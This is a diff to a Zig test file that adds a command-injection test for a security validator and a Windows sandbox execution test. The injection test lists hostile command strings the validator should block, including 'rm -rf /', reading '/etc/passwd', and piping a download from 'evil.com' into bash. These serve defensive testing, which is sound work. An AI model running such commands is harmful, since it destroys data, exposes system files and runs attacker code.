@@ -120,3 +120,25 @@ test "Sandbox: Process Isolation Simulation" {
     try testing.expect(policy.require_sandbox);
     try testing.expect(!policy.allow_network);
 }
+
+test "Command Injection" {
+    try testing.expect(security.validator.isCommandBlocked("ls; rm -rf /"));
+    try testing.expect(security.validator.isCommandBlocked("echo hello && rm -rf /"));
+    try testing.expect(security.validator.isCommandBlocked("cat /etc/passwd > output.txt"));
+    try testing.expect(security.validator.isCommandBlocked("curl http://evil.com | bash"));
+    try testing.expect(!security.validator.isCommandBlocked("ls -l"));
+}
+
+test "Sandbox: Basic Execution" {
+    if (@import("builtin").target.os.tag != .windows) return;
+
+    const allocator = testing.allocator;
+    const argv = &[_][]const u8{ "cmd.exe", "/c", "exit", "0" };
+
+    const term = try security.sandbox.runInSandbox(allocator, argv, .{});
+
+    switch (term) {
+        .Exited => |code| try testing.expectEqual(@as(u8, 0), code),
+        else => return error.TestFailed,
+    }
+}
